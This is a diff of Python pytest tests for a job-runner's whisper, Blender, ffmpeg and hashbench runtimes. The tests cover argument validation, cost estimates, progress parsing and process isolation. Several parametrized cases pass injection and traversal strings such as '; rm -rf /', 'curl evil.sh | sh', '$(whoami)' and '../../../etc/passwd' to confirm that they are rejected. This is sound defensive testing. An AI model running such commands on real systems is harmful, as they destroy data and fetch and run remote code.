@@ -8,6 +8,8 @@ into arbitrary execution or reach outside its job directory.
 from __future__ import annotations
 
 import asyncio
+import os
+import sys
 from collections.abc import Callable
 from pathlib import Path
 
@@ -15,7 +17,11 @@ import pytest
 
 from haze.jobs import runtimes
 from haze.jobs.executor import Caps, JobExecutor, new_job_id
-from haze.jobs.progress import BlenderProgressParser, FfmpegProgressParser
+from haze.jobs.progress import (
+    BlenderProgressParser,
+    FfmpegProgressParser,
+    WhisperProgressParser,
+)
 from haze.jobs.spec import JobSpec, JobState, ResourceRequest
 
 
@@ -203,11 +209,188 @@ def test_blender_refuses_an_arbitrary_device_string(tmp_path: Path) -> None:
         )
 
 
+# whisper validates its arguments *before* checking whether faster-whisper is
+# installed, so every rejection below runs on a machine (and in CI) without the
+# optional extra. That ordering is the reason these tests are worth anything:
+# the alternative is a permanently-skipped test for the checks that matter most.
+
+@pytest.mark.parametrize(
+    ("args", "expected"),
+    [
+        # A model name reaches WhisperModel, which accepts a local path or a
+        # Hugging Face repo id -- so an arbitrary string is an arbitrary read
+        # and an arbitrary download.
+        ({"model": "; rm -rf /"}, "model"),
+        ({"model": "../../../etc/passwd"}, "model"),
+        ({"device": "; rm -rf /"}, "device"),
+        ({"device": "cuda; curl evil.sh | sh"}, "device"),
+        ({"compute_type": "$(whoami)"}, "compute_type"),
+        ({"format": "../../etc/passwd"}, "format"),
+        ({"language": "en; rm -rf /"}, "language"),
+        ({"beam_size": 0}, "beam_size"),
+        ({"beam_size": 10**6}, "beam_size"),
+        ({"beam_size": "five"}, "beam_size"),
+        ({"beam_size": True}, "beam_size"),
+        ({"vad_filter": "yes"}, "vad_filter"),
+    ],
+)
+def test_whisper_refuses_arbitrary_argument_values(
+    tmp_path: Path, args: dict[str, object], expected: str
+) -> None:
+    (tmp_path / "a.wav").write_bytes(b"\x00")
+    with pytest.raises(runtimes.JobArgumentError, match=expected) as caught:
+        runtimes.get("whisper").prepare({"audio": "a.wav", **args}, tmp_path)
+    # Not "faster-whisper is not installed": that would mean the rejection came
+    # from the availability check rather than from validating the value.
+    assert "not installed" not in str(caught.value)
+
+
+def test_whisper_audio_cannot_escape_the_job_directory(tmp_path: Path) -> None:
+    with pytest.raises(runtimes.JobArgumentError, match="escapes the job directory"):
+        runtimes.get("whisper").prepare({"audio": "../../../etc/passwd"}, tmp_path)
+
+
+def test_whisper_names_the_models_it_will_accept(tmp_path: Path) -> None:
+    """A refusal that does not say what IS allowed sends the peer guessing."""
+    (tmp_path / "a.wav").write_bytes(b"\x00")
+    with pytest.raises(runtimes.JobArgumentError, match="large-v3") as caught:
+        runtimes.get("whisper").prepare({"audio": "a.wav", "model": "huge"}, tmp_path)
+    assert "base" in str(caught.value)
+
+
+def test_whisper_builds_a_python_argv_with_a_cached_model_home(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    if not runtimes.get("whisper").available():
+        pytest.skip("faster-whisper not installed")
+    monkeypatch.setenv("HAZE_HOME", str(tmp_path / "home"))
+    (tmp_path / "talk.wav").write_bytes(b"\x00")
+
+    prepared = runtimes.get("whisper").prepare(
+        {"audio": "talk.wav", "model": "base", "format": "srt"}, tmp_path
+    )
+
+    # Invoked as a module, like hashbench: a library, not a binary, but still
+    # through the normal subprocess path so the caps apply.
+    assert prepared.argv[:3] == [sys.executable, "-m", "haze.jobs.runtimes.whisper"]
+    assert prepared.explicit_outputs == [tmp_path / "out" / "talk.srt"]
+    # Without a stable model home every job re-downloads gigabytes.
+    assert prepared.env["HF_HOME"].startswith(str(tmp_path / "home"))
+
+
+def test_whisper_only_allows_models_the_library_knows() -> None:
+    """The allowlist is a literal, so that validating one argument does not cost
+    seconds of importing faster-whisper inside the agent's event loop. This is
+    what keeps the literal honest wherever the extra is actually installed."""
+    if not runtimes.get("whisper").available():
+        pytest.skip("faster-whisper not installed")
+    from faster_whisper.utils import _MODELS as LIBRARY_MODELS
+
+    from haze.jobs.runtimes.whisper import _MODELS
+
+    assert _MODELS.issubset(LIBRARY_MODELS), "allowlist names a model the library cannot resolve"
+
+
 def test_every_registered_runtime_declares_itself() -> None:
-    assert set(runtimes.REGISTRY) == {"hashbench", "blender", "ffmpeg"}
+    assert set(runtimes.REGISTRY) == {"hashbench", "blender", "ffmpeg", "whisper"}
     for name, runtime in runtimes.REGISTRY.items():
         assert runtime.name == name
         assert runtime.description
+
+
+# --- work estimates ---------------------------------------------------------
+# What the scheduler is told a job costs, when the submitter does not say. The
+# numbers themselves are stated constants rather than measurements (except
+# hashbench's, which is the definition of the baseline) -- so what is worth
+# testing is that each one moves with the argument that should move it, and
+# that a runtime with nothing to go on says so instead of inventing a figure.
+
+def test_hashbench_work_scales_with_rounds() -> None:
+    hashbench = runtimes.REGISTRY["hashbench"]
+    small = hashbench.estimate_work_units({"rounds": 100}, [])
+    large = hashbench.estimate_work_units({"rounds": 1000}, [])
+    assert large == pytest.approx(small * 10)
+
+
+def test_hashbench_uses_its_documented_default_round_count() -> None:
+    """The estimate and prepare() must agree about what "no rounds given"
+    means, or a job is placed as one size and run as another."""
+    from haze.jobs.runtimes.hashbench import SECONDS_PER_ROUND
+
+    hashbench = runtimes.REGISTRY["hashbench"]
+    assert hashbench.estimate_work_units({}, []) == pytest.approx(200 * SECONDS_PER_ROUND)
+
+
+def test_blender_work_scales_with_the_frame_count() -> None:
+    from haze.jobs.runtimes.blender import SECONDS_PER_FRAME
+
+    blender = runtimes.REGISTRY["blender"]
+    one = blender.estimate_work_units({"frame_start": 1, "frame_end": 1}, [])
+    ten = blender.estimate_work_units({"frame_start": 5, "frame_end": 14}, [])
+    assert one == pytest.approx(SECONDS_PER_FRAME)
+    assert ten == pytest.approx(10 * SECONDS_PER_FRAME)
+
+
+@pytest.mark.parametrize(
+    "name,args",
+    [
+        ("hashbench", {"rounds": "lots"}),
+        ("blender", {"frame_start": 10, "frame_end": 1}),
+        ("ffmpeg", {"input": "nothing-was-sent.mov"}),
+        ("whisper", {"audio": "nothing-was-sent.wav"}),
+    ],
+)
+def test_an_unsizeable_job_falls_back_to_the_default(name: str, args: dict[str, object]) -> None:
+    """Arguments prepare() will reject, or an input that is not being sent.
+
+    Estimating is not the place to raise: the executor rejects a bad job a
+    moment later with a message written for the submitter, and a guess is not
+    worth crashing a placement over.
+    """
+    assert runtimes.REGISTRY[name].estimate_work_units(args, []) == runtimes.DEFAULT_WORK_UNITS
+
+
+def test_media_runtimes_price_a_clip_by_its_duration(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Duration, not file size: bitrate varies by an order of magnitude between
+    a phone clip and a ProRes master, so bytes are a poor proxy for compute."""
+    from haze.jobs import media
+
+    clip = tmp_path / "clip.mov"
+    clip.write_bytes(b"not really a video")
+    monkeypatch.setattr(media, "duration_seconds", lambda _p: 120.0)
+
+    ffmpeg = runtimes.REGISTRY["ffmpeg"]
+    software = ffmpeg.estimate_work_units({"input": "clip.mov", "encoder": "libx265"}, [clip])
+    hardware = ffmpeg.estimate_work_units({"input": "clip.mov", "encoder": "h264_nvenc"}, [clip])
+    assert software > hardware, "hardware encoding must look cheaper, or nothing prefers it"
+
+    audio = tmp_path / "talk.wav"
+    audio.write_bytes(b"not really audio")
+    whisper = runtimes.REGISTRY["whisper"]
+    tiny = whisper.estimate_work_units({"audio": "talk.wav", "model": "tiny"}, [audio])
+    large = whisper.estimate_work_units({"audio": "talk.wav", "model": "large-v3"}, [audio])
+    assert large > tiny
+
+
+def test_whisper_reads_turbo_out_of_a_name_that_also_says_large() -> None:
+    """`large-v3-turbo` is a turbo model. Matching in dictionary order would
+    price it as a large one and ship a cheap job across the network."""
+    from haze.jobs.runtimes.whisper import REALTIME_FACTORS, _realtime_factor
+
+    assert _realtime_factor("large-v3-turbo") == REALTIME_FACTORS["turbo"]
+    assert _realtime_factor("large-v3") == REALTIME_FACTORS["large"]
+    assert _realtime_factor("distil-small.en") == REALTIME_FACTORS["small"]
+
+
+def test_an_input_the_submitter_is_not_sending_is_not_stat_ed(tmp_path: Path) -> None:
+    """The named file is matched against the files travelling with the job, not
+    against whatever happens to sit at that path on this machine."""
+    from haze.jobs import media
+
+    assert media.duration_of_named("elsewhere.mov", []) is None
+    assert media.duration_of_named(None, []) is None
 
 
 # --- progress parsing -------------------------------------------------------
@@ -298,3 +481,65 @@ def test_progress_admits_when_it_cannot_compute_a_fraction() -> None:
     parser.feed("out_time_ms=5000000")
     assert parser.progress.fraction is None
     assert parser.progress.frames_done == 10
+
+
+def test_whisper_progress_is_a_fraction_of_audio_seconds() -> None:
+    parser = WhisperProgressParser()
+    parser.feed("duration 240.00")
+    assert parser.progress.frames_total == 240
+
+    parser.feed("processed 120.00s / 240.00s")
+    assert parser.progress.fraction == pytest.approx(0.5)
+    assert parser.progress.frames_done == 120
+    assert parser.progress.rate.endswith("x realtime")
+    assert parser.progress.eta_seconds is not None
+
+    parser.feed("segment So the first thing to notice")
+    assert "first thing" in parser.progress.detail
+
+    parser.feed("done")
+    assert parser.progress.fraction == 1.0
+
+
+def test_whisper_ignores_the_librarys_own_chatter() -> None:
+    """ctranslate2 and huggingface_hub both log to the same merged stream."""
+    parser = WhisperProgressParser()
+    for line in ("Processing audio with duration 00:04:00.000", "", "config.json: 100%|##|"):
+        assert parser.feed(line) is False
+    assert parser.progress.fraction is None
+
+
+def test_whisper_admits_when_it_has_no_duration() -> None:
+    """A zero duration means no honest percentage -- same rule as ffmpeg."""
+    parser = WhisperProgressParser()
+    parser.feed("duration 0.00")
+    parser.feed("processed 12.00s / 0.00s")
+    assert parser.progress.fraction is None
+    assert parser.progress.frames_done == 12
+
+
+async def test_a_job_runs_in_its_own_process_group(tmp_path, monkeypatch):
+    """The executor signals the *group* to stop a job, because ffmpeg and
+    Blender both spawn helpers that outlive a kill aimed at the parent.
+
+    If a child ever shared the agent's group, that same killpg would take down
+    the agent and the shell that launched it -- so this asserts the separation
+    the whole teardown path depends on.
+    """
+    if not hasattr(os, "getpgid"):
+        pytest.skip("POSIX process groups only")
+
+    monkeypatch.setenv("HAZE_HOME", str(tmp_path))
+    executor = JobExecutor()
+    spec = _spec(rounds=4000)
+    record = executor.submit(spec)
+    await _wait_until(
+        lambda: spec.job_id in executor._processes, "job never started"
+    )
+
+    process = executor._processes[spec.job_id]
+    assert os.getpgid(process.pid) != os.getpgrp()
+
+    await executor.cancel(spec.job_id)
+    await _wait_until(lambda: record.state.terminal, "job did not stop")
+    await executor.shutdown()
